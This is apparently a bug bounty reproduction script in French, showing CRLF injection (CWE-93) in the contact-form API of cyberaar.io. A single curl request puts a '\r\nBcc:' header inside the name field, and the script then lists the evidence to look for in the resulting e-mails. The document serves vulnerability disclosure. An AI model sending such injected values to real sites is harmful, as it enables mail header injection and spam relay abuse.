#!/usr/bin/env bash
# Reproduction - injection CRLF dans l'e-mail de notification (CWE-93)
# Cible : POST https://cyberaar.io/api/contact  (actif "API formulaires", classe Standard)
# Note : 1 seule requete, pour respecter le plafond de la plateforme (regles du programme).
set -euo pipefail
ADRESSE_TEST="votre-adresse-de-test@example.com"   # une adresse reelle (les jetables sont refusees)
curl -s -i -X POST https://cyberaar.io/api/contact \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://cyberaar.io' \
  -H 'Referer: https://cyberaar.io/contact/' \
  --data-raw "$(printf '{"name":"Test CyberAar\\r\\nBcc: attaquant@example.org","email":"%s","subject":"Test programme","message":"Message de test - rapport de bug bounty."}' "$ADRESSE_TEST")"
echo
echo "--> Reponse attendue : HTTP 200 {\"success\":true}  (la charge est acceptee telle quelle)"
echo "--> Preuve : l'accuse de reception recu par ADRESSE_TEST commence par 'Bonjour,' SANS le nom"
echo "-->        (le \\r\\n injecte a coupe la ligne : la valeur est inserte brute dans le corps)"
echo "--> Verification en-tetes : sur l'e-mail recu par l'equipe (contact@cyberaar.io),"
echo "    'Afficher l'original' puis rechercher un en-tete Bcc/Content-Type/Subject supplementaire"
echo "    ou une ligne 'From:'/'Reply-To:' dans le corps."
